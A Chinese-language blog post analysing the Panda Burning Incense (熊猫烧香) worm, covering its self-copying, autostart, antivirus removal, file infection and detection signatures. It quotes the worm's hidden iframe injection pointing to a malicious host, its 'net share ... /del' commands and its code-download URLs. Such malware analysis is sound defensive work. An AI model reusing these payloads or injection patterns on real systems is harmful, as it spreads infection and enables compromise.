<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="熊猫烧香病毒分析报告"><meta name="keywords" content="病毒分析,熊猫烧香"><meta name="author" content="yangruiqi,undefined"><meta name="copyright" content="yangruiqi"><title>熊猫烧香病毒分析报告 | manyouyou</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css?version=1.5.5"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://unpkg.com"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitment/style/default.min.css"><script src="https://cdn.jsdelivr.net/npm/gitment/dist/gitment.browser.min.js"></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  localSearch: {"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}"},"path":"search.xml"}
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#样本概况"><span class="toc-number">1.</span> <span class="toc-text">样本概况</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#样本信息"><span class="toc-number">1.1.</span> <span class="toc-text">样本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-测试环境及工具"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 测试环境及工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-分析目标"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 分析目标</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2．具体行为分析"><span class="toc-number">2.</span> <span class="toc-text">2．具体行为分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-主要行为"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 主要行为</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1-恶意程序对用户造成的危害"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1 恶意程序对用户造成的危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-恶意代码分析"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 恶意代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-病毒主逻辑"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 病毒主逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-恶意程序的代码分析片段"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 恶意程序的代码分析片段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-1-病毒解密校验部分"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">2.2.2.1 病毒解密校验部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-2-病毒创建和运行部分"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">2.2.2.2 病毒创建和运行部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-3-病毒感染部分"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">2.2.2.3 病毒感染部分</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-解决方案"><span class="toc-number">3.</span> <span class="toc-text">3. 解决方案</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-提取病毒的特征，利用杀毒软件查杀"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 提取病毒的特征，利用杀毒软件查杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-手工查杀步骤"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 手工查杀步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3工具查杀步骤或是查杀思路"><span class="toc-number">3.3.</span> <span class="toc-text">3.3工具查杀步骤或是查杀思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5．总结"><span class="toc-number">4.</span> <span class="toc-text">5．总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6．参考资料"><span class="toc-number">5.</span> <span class="toc-text">6．参考资料</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/%E5%A4%B4%E5%83%8F/touxiang.jpg"></div><div class="author-info__name text-center">yangruiqi</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/yangruiqiyr" target="_blank">跟随我</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">28</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">41</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">15</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">相关网址</div><a class="author-info-links__name text-center" href="http://blog.topsec.com.cn/" target="_blank">天融信阿尔法实验室</a><a class="author-info-links__name text-center" href="https://www.baidu.com/" target="_blank">百度</a><a class="author-info-links__name text-center" href="https://bbs.pediy.com/" target="_blank">看雪</a><a class="author-info-links__name text-center" href="http://www.freebuf.com/" target="_blank">FreeBuf</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/主题/主题1.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">manyouyou</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">档案</a><a class="site-page" href="/tags">标题</a><a class="site-page" href="/categories">分类</a></span></div><div id="post-info"><div id="post-title">熊猫烧香病毒分析报告</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-07-16</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/报告-熊猫烧香病毒分析报告/">报告 - 熊猫烧香病毒分析报告</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><table>
<thead>
<tr>
<th>样本名</th>
<th>panda.exe</th>
</tr>
</thead>
<tbody>
<tr>
<td>作者</td>
<td>杨睿琦</td>
</tr>
<tr>
<td>时间</td>
<td>2018-07-10 14:53:05</td>
</tr>
<tr>
<td>平台</td>
<td>win7_sp1_enx86_office2013</td>
</tr>
</tbody>
</table>
<h1 id="样本概况"><a href="#样本概况" class="headerlink" title="样本概况"></a>样本概况</h1><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><table>
<thead>
<tr>
<th>病毒名称</th>
<th>2_dump_SCY.exe</th>
</tr>
</thead>
<tbody>
<tr>
<td>所属家族</td>
<td>熊猫烧香</td>
</tr>
<tr>
<td>样本名称</td>
<td>0c15096fb3bc30800f7af002c25953162b799391300a62b8507fe8e4f6532768</td>
</tr>
<tr>
<td>样本类型</td>
<td>MS-DOS executable</td>
</tr>
<tr>
<td>样本大小</td>
<td>98816byte</td>
</tr>
<tr>
<td>MD5</td>
<td>b8f8e75c9e77743a61bbea9ccbcffd5d</td>
</tr>
<tr>
<td>SHA1</td>
<td>188fc8fc580c0ea4bf8a8900a3d36471823c8923</td>
</tr>
<tr>
<td>SHA256</td>
<td>0c15096fb3bc30800f7af002c25953162b799391300a62b8507fe8e4f6532768</td>
</tr>
<tr>
<td>SSDeep</td>
<td>3072:apAja0pSLwYqK6hVZ7N4bdq4a53YKCOTpc:a2ja0pShqK65ZOq4QYK1m</td>
</tr>
<tr>
<td>CRC32</td>
<td>E63D45D3</td>
</tr>
<tr>
<td>病毒行为</td>
<td>设置注册表实现自启动</td>
</tr>
<tr>
<td>病毒行为</td>
<td>修改资源管理器（explorer）的文件夹的隐藏属性</td>
</tr>
<tr>
<td>病毒行为</td>
<td>有将进程的内存属性修改为可执行或可写</td>
</tr>
<tr>
<td>病毒行为</td>
<td>向系统服务发送控制码</td>
</tr>
<tr>
<td>病毒行为</td>
<td>修改注册表自启动</td>
</tr>
<tr>
<td>病毒行为</td>
<td>枚举进程</td>
</tr>
<tr>
<td>病毒行为</td>
<td>结束杀软进程</td>
</tr>
<tr>
<td>病毒行为</td>
<td>删除安全软件相关启动项</td>
</tr>
<tr>
<td>病毒行为</td>
<td>删除服务</td>
</tr>
<tr>
<td>病毒行为</td>
<td>复制自身</td>
</tr>
<tr>
<td>病毒行为</td>
<td>感染PE文件</td>
</tr>
<tr>
<td>病毒行为</td>
<td>覆写PE文件</td>
</tr>
</tbody>
</table>
<h2 id="1-2-测试环境及工具"><a href="#1-2-测试环境及工具" class="headerlink" title="1.2 测试环境及工具"></a>1.2 测试环境及工具</h2><p>Process Monitor、火绒剑、OD、IDA、MD5工具、Win7</p>
<h2 id="1-3-分析目标"><a href="#1-3-分析目标" class="headerlink" title="1.3 分析目标"></a>1.3 分析目标</h2><p>分析此病毒的恶意行为，达到了解和解析此病毒。</p>
<h1 id="2．具体行为分析"><a href="#2．具体行为分析" class="headerlink" title="2．具体行为分析"></a>2．具体行为分析</h1><p>分析此病毒的恶意行为，首先我们用微步沙箱分析下此病毒<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/1.png?x-oss-process=style/yangruiqi.com" alt="1"></p>
<p>发现了共2个进程<br>2_dump_SCY.exe(PID:3432)<br>“C:\Users\vbccsb\AppData\Local\Temp\2_dump_SCY.exe”<br>spo0lsv.exe(PID:3612)<br>C:\Windows\system32\drivers\spo0lsv.exe<br>然后做了如图中的行为。<br>使用IDA和OD结合观察。发现了此程序分为3个重要的CALL。如下：<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/2.png?x-oss-process=style/yangruiqi.com" alt="2"></p>
<p>病毒的主要行为分三部分：<br>第一部分（自我保护与自我复制）：<br>复制自身到系统目录<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/3.png?x-oss-process=style/yangruiqi.com" alt="3"><br>第二部分（感染部分）：<br>感染全盘（本地）、定时器感染全盘（本地）、局域网感染（联网）<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/4.png?x-oss-process=style/yangruiqi.com" alt="4"><br>第三部分(病毒自我保护)：<br>设置注册表、停止杀软、网站下载代码并执行，就是下图6个定时器部分   </p>
<p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/5.png?x-oss-process=style/yangruiqi.com" alt="5"></p>
<p>最后是熊猫烧香的整体执行流程<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/6.png?x-oss-process=style/yangruiqi.com" alt="6"></p>
<h2 id="2-1-主要行为"><a href="#2-1-主要行为" class="headerlink" title="2.1 主要行为"></a>2.1 主要行为</h2><h3 id="2-1-1-恶意程序对用户造成的危害"><a href="#2-1-1-恶意程序对用户造成的危害" class="headerlink" title="2.1.1 恶意程序对用户造成的危害"></a>2.1.1 恶意程序对用户造成的危害</h3><p>(这里详细描述分析的步骤以及每一个行为的关键代码以及整体流程图)<br>首先在虚拟机里运行下病毒，用Process Monitor简单观察进程树，看看有什么行为查看到如下图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/7.png?x-oss-process=style/yangruiqi.com" alt="7"><br>系统启动之后，在进程树中可以发现，“2_dump_SCY.exe”衍生出了spo01sv.exe，spo01sv.exe进程打开了两次“cmd.exe”。第一次运行的命令是cmd.exe /c net share C$ /del /y，它的意思是在命令行模式下删除C盘的网络共享，执行完后关闭cmd.exe。因为虚拟机只有一个C盘，因此有理由相信，这个病毒应该是会关闭系统中所有的盘的网络共享。一个是cmd.exe /c net share admin$ /del /y，这里取消的是系统根目录的共享。那么由此就可以总结出病毒的两点行为。所以根据这些操作总结出病毒两点行为：<br><strong>病毒行为1</strong>：病毒本身创建了名为“spoclsv.exe”的进程，该进程文件的路径为：C:\Windows\system32\drivers\spo0lsv.exe<br><strong>病毒行为2</strong>：在命令行模式下使用net share命令来取消系统中的共享。<br>先查看下2_dump_SCY.exe的行为，运用过滤器，先查看下Operation的CreateFile，发现在C:\Windows\system32\drivers\spo0lsv.exe。其他注册表之类的没有发现什么异常，所以推测spo0lsv.exe是真正做坏事的进程，下面监控spo0lsv.exe，查看下其对于注册表的删除，使用RegDeleteValue，发现他删除了很多在CurrentVersion/Run下的东西，都是杀毒软件的自启动项如下图。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/8.png?x-oss-process=style/yangruiqi.com" alt="8"><br>所以<strong>病毒行为3</strong>：删除安全软件在注册表中的自启动项。再查看下创建了哪些键值，设置了哪些值，过滤RegCreateKey和RegSetValue，如图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/9.png" alt="9"><br>发现在Run/svcshare,所以发现<strong>病毒行为4</strong>：设置开机病毒自启动，以及<strong>病毒行为5</strong>：设置隐藏的文件无法通过普通的设置显示，另外通过滤文件创建，发现<strong>病毒行为6</strong>：将自身文件拷贝到C盘，创建Desktop_.ini,如图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/10.png?x-oss-process=style/yangruiqi.com" alt="10"><br>然后看网络部分，发现<strong>病毒行为7</strong>：一直在连接网络收发包。如图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/11.png?x-oss-process=style/yangruiqi.com" alt="11"><br>观察感染后的文件<strong>病毒行为8</strong>：发现感染PE文件后，会在文件的末尾写上标志，格式为：<br>WhBoy+ 源文件名 + “.exe” + 0x2标记+源文件大小+0x1标记<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/12.png?x-oss-process=style/yangruiqi.com" alt="12"></p>
<h2 id="2-2-恶意代码分析"><a href="#2-2-恶意代码分析" class="headerlink" title="2.2 恶意代码分析"></a>2.2 恶意代码分析</h2><h3 id="2-2-1-病毒主逻辑"><a href="#2-2-1-病毒主逻辑" class="headerlink" title="2.2.1 病毒主逻辑"></a>2.2.1 病毒主逻辑</h3><p>病毒的行为总体分为3个逻辑块，首先第一个部分就是病毒复制自身到系统目录名字为spcolsv.exe，然后运行起来，关闭当前病毒的运行进程。   </p>
<h3 id="2-2-2-恶意程序的代码分析片段"><a href="#2-2-2-恶意程序的代码分析片段" class="headerlink" title="2.2.2 恶意程序的代码分析片段"></a>2.2.2 恶意程序的代码分析片段</h3><h4 id="2-2-2-1-病毒解密校验部分"><a href="#2-2-2-1-病毒解密校验部分" class="headerlink" title="2.2.2.1 病毒解密校验部分"></a>2.2.2.1 病毒解密校验部分</h4><p>首先病毒会进行两次加密字符串的解密，一次“xboy”，一次“whboy”，两次都成功才会进入核心功能。这里的需要解密的代码就是boyx4个字母分别除A然后余数跟加密过的代码循环做异或，就得到了真正的密码。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/13.png?x-oss-process=style/yangruiqi.com" alt="13">   </p>
<h4 id="2-2-2-2-病毒创建和运行部分"><a href="#2-2-2-2-病毒创建和运行部分" class="headerlink" title="2.2.2.2 病毒创建和运行部分"></a>2.2.2.2 病毒创建和运行部分</h4><p>主体的第一个部分就是call sub_40819C，此部分主要就是病毒复制自身到系统目录下，名字为spcolsv.exe。<br>分部的步骤如下：<br>先检查下当前进程文件目录下是否有一个叫Desktop.ini的文件，反汇编代码如下图。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/14.png?x-oss-process=style/yangruiqi.com" alt="14"><br>如果有的话去删除这个文件。然后进入新的流程。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/15.png?x-oss-process=style/yangruiqi.com" alt="15"><br>然后将病毒信息存放到之前申请的内存中，包括暴力破解的字典等，然后设置ZF位为1，目的是感染其他文件。<br>接着进行编辑检查工作，以判断病毒程序是否被多次运行，设置相关标记信息。如图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/16.png?x-oss-process=style/yangruiqi.com" alt="16"><br>接着进行判断，判断当前进程是否是第一次，执行，如果不是第一次就判断是否是伪装好的目录<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/17.png?x-oss-process=style/yangruiqi.com" alt="17"><br>如果当前进程不是Windows\system32\drivers\spo0lsv.exe，就将病毒文件改为spo0lsv.exe后复制到~\Windows\system32\drivers\spolsv.exe。然后运行起来复制过去的病毒样本，关闭当前病毒进程。这部分反汇编如下：<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/18.png?x-oss-process=style/yangruiqi.com" alt="18"><br>如果当前进程是Windows\system32\drivers\spo0lsv.exe，说明病毒不是第一次运行并且已经伪装好了。会执行如下代码<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/19.png?x-oss-process=style/yangruiqi.com" alt="19"><br>这段代码释放之前申请的用于存放病毒文件信息的内存从，获取标记信息。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/20.png?x-oss-process=style/yangruiqi.com" alt="20"><br>这段代码主要是获取标记并今夕检查，标记为1时，进入的流程是被感染的程序loc_408477。下面分析下感染的过程。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/21.png?x-oss-process=style/yangruiqi.com" alt="21"><br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/22.png?x-oss-process=style/yangruiqi.com" alt="22"><br>这段主要功能是将被感染的文件进行分离，提取出原始文件信息，由于感染文件结构是：病毒代码+原始代码+标记信息，最后保存的是标记信息，通过这些信息可以得到原始文件。所以上述代码执行之后会在程序所在目录释放出一个原始文件。<br>当创建完原始文件之后，就创建和运行批处理文件代码如下<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/23.png?x-oss-process=style/yangruiqi.com" alt="23"><br>总得来说就是先删除源文件，然后把感染的文件改名为原文件的名字。然后进行遍历在运行的进程，如果进程中不存在“spcolsv.exe”,则从病毒文件中分离出病毒程序，重新执行，累死与之前的代码。<br>这就是病毒创建和运行部分，可以总结得出，被感染文件的主要工作室文虎进程中伪造的病毒程序，“spcolsv.exe”,如果这个病毒被处理掉，则由被感染的程序再次生成，这样病毒的生命力会变得很顽强，只有修复了所以被感染的程序才能将其杀死。</p>
<h4 id="2-2-2-3-病毒感染部分"><a href="#2-2-2-3-病毒感染部分" class="headerlink" title="2.2.2.3 病毒感染部分"></a>2.2.2.3 病毒感染部分</h4><p>病毒的感染部分是病毒的核心部分。下面就来分析这个模块的相关操作。首先这个病毒通过3种方式进行感染，前面两种是本地进行病毒感染，第三种是通过网络传染病毒。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/24.png?x-oss-process=style/yangruiqi.com" alt="24"><br>然后分析第一个创建感染线程的回调函数。在其中遍历盘符数目，并且通过一个函数进入到驱动器中，遍历所有可感染文件以复制病毒，如下图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/25.png?x-oss-process=style/yangruiqi.com" alt="25"><br>这段代码主要是遍历了驱动器下的文件信息，将文件和文件夹进行了分类，排除了特殊文件夹，查询到是非特殊文件夹时， 病毒要进行感染操作，具体分析如下图。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/26.png?x-oss-process=style/yangruiqi.com" alt="26"><br>这段主要作用是执行了感染前的检查工作，若被感染了则继续遍历，如果没有被感染则修改DeskTop_.ini文件，写入感染时间。返回上面“004093E30”处继续循环处，继续循环遍历。当查找到时文件属性是，会跳转到00409BFC，对文件感染，相关代码如下图：<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/27.png?x-oss-process=style/yangruiqi.com" alt="27"><br>这段代码对文件进行检查，查看后缀是否是“GHO”，就判断是恢复文件，直接删除，防止用户还原系统。<br>一旦删除了系统备份文件，病毒就进入了感染操作。感染分为2种，感染本地文件种类和与感染网络相关的文件。<br>然后我们排除setup.exe和NTDETECT.COM,开始感染，然后判断是不是exe，是的话感染函数如下：<br>首先判断是不是正在运行，如果正在运行则放弃感染，再判断与病毒是否在同一个路径下，是则退出感染。然后读取将要被感染的文件到内存中，查看文件中是否有“Whboy”的标志，如果有则放弃感染，然后就是如下代码，如图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/28.png?x-oss-process=style/yangruiqi.com" alt="28"><br>上述代码就是复制病毒程序主体文件，覆盖要被感染的文件，如果复制成功就继续感染，失败则退出感染。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/29.png?x-oss-process=style/yangruiqi.com" alt="29"><br>然后上图代码就是最后的操作，再最后添加标记“Whboy”+“源文件名”+0x2+“文件大小”+0x1,。这个就是感染本地运行程序的相关代码。<br>下面分析Inject，根据火绒剑和010editor观察，就是在文件最后写入字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=http://www.krvkr.com/worm.htm width=0 height=0&gt;&lt;/ifame&gt;&gt;</span><br></pre></td></tr></table></figure></p>
<p>。<br>其次有两个端口135,80<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/30.png?x-oss-process=style/yangruiqi.com" alt="30"><br>下面分析最后一个程序定时器感染，首先进入这个函数可以看到<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/31.png?x-oss-process=style/yangruiqi.com" alt="31"><br>一共创建了6个定时器。每个定时器作用分别是：   </p>
<ol>
<li>sub_40CEE4,添加启动项，修改注册表。   </li>
<li>sub_40D040,下载恶意代码。   </li>
<li>sub_40D048,下载恶意代码，执行cmd命令。   </li>
<li>sub_406E44,删除杀毒软件启动项，关闭杀毒软件服务。   </li>
<li>sub_40CC4C,打开解密之后的网页。   </li>
<li><p>sub_40C728,下载恶意代码。<br>下面来详细分析这几个定时器。<br>第一个定时器sub_40CEE4,添加启动项，修改注册表。定时器的分析代码如下。<br>首先由如下代码<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/32.png?x-oss-process=style/yangruiqi.com" alt="32"><br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/33.png?x-oss-process=style/yangruiqi.com" alt="33"><br>这里是添加特权。    </p>
<p>其次定时器回调里有一个函数   </p>
</li>
</ol>
<p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/34.png?x-oss-process=style/yangruiqi.com" alt="34"></p>
<p>这里就是关闭一些进程。代码如下通过发消息，WM_QUIT来关闭。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/35.png?x-oss-process=style/yangruiqi.com" alt="35"><br>发现首先拼接了个字符串，”svcshare”, “Software\Microsoft\Windows\CurrentVersion\Run”,所以在做的操作就是修改注册表，将病毒设置为启动项。另外”SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue”，设置隐藏的文件无法通过普通的设置显示。<br>下面分析第二个定时器sub_40D040,下载恶意代码。<br>第二个定时器回调函数里，创建了一个线程，然后从网站<a href="http://www.ac86.cn/66/up.txt下载恶意代码，关键代码如下图" target="_blank" rel="noopener">http://www.ac86.cn/66/up.txt下载恶意代码，关键代码如下图</a><br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/36.png?x-oss-process=style/yangruiqi.com" alt="36"><br>首先观察代码，第三个定时器创建了两个线程，并且kill了定时器。下面我们先开第一个线程的回调函数，这个线程的回调就跟第二个定时去世一个回调函数sub_40C9B0,所以功能一样，都是从<a href="http://www.ac86.cn/66/up.txt下载恶意代码，然后观察第二个线程。" target="_blank" rel="noopener">http://www.ac86.cn/66/up.txt下载恶意代码，然后观察第二个线程。</a><br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/37.png?x-oss-process=style/yangruiqi.com" alt="37"><br>发现这个线程的作用是执行cmd命令cmd.exe /c net share C$ /del /y，在命令行模式下删除C盘的网络共享，执行完后关闭cmd.exe。因为虚拟机只有一个C盘，因此有理由相信，这个病毒应该是会关闭系统中所有的盘的网络共享。一个是cmd.exe /c net share admin$ /del /y，这里取消的是系统根目录的共享。<br>下面观察第四个定时器sub_406E44,删除杀毒软件启动项，关闭杀毒软件服务。如下图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/38.png?x-oss-process=style/yangruiqi.com" alt="38"><br>目的是打开解密之后的网页。<br>第六个定时器sub_40C728,下载恶意代码。如图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/39.png?x-oss-process=style/yangruiqi.com" alt="39"><br>从<a href="http://update.whboy.net/worm.txt获取恶意代码。" target="_blank" rel="noopener">http://update.whboy.net/worm.txt获取恶意代码。</a><br>以上就是本病毒的具体分析。</p>
<h1 id="3-解决方案"><a href="#3-解决方案" class="headerlink" title="3. 解决方案"></a>3. 解决方案</h1><h2 id="3-1-提取病毒的特征，利用杀毒软件查杀"><a href="#3-1-提取病毒的特征，利用杀毒软件查杀" class="headerlink" title="3.1 提取病毒的特征，利用杀毒软件查杀"></a>3.1 提取病毒的特征，利用杀毒软件查杀</h2><p>3.1 提取病毒的特征，利用杀毒软件查杀<br>特征网络 ip：<br>（1）<a href="http://www.tom.com/" target="_blank" rel="noopener">www.tom.com/</a><br>（2）<a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com/</a><br>（3）<a href="http://www.sohu.com/" target="_blank" rel="noopener">www.sohu.com/</a><br>（4）<a href="http://www.yahoo.com/" target="_blank" rel="noopener">www.yahoo.com/</a><br>（5）<a href="http://www.ac86.cn/66/up.txt" target="_blank" rel="noopener">www.ac86.cn/66/up.txt</a><br>特征字符串：<br>（1）WhBoy<br>（2） SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Ad<br>vanced\Folder\Hidden\SHOWALL\CheckedValue<br>（3）感谢艾玛,mopery,海色の月,对此木马的关注!~<br>（4）<code>uup2..uxe</code>tm/vhjnx.fdu/ nsm&amp;uyt<br>（5） =nb{end’w{g&gt;ispy&gt;,.ps~<em>bb?2’gm.12&amp;mmeb|’lwl’s<code></code>wi:&amp;9&amp;#ibmn<br>lw&lt;%4+:?.nb{end9<br>（6）d}tq;</em>&amp;tyld|l. lboy’blt.vj{l’|}| 可以通过本文最后的查杀或修复文件工具算法实现匹配特征值（CRC32 或字 符串）进行查杀，也可以使用相应查杀工具进行杀毒。    </p>
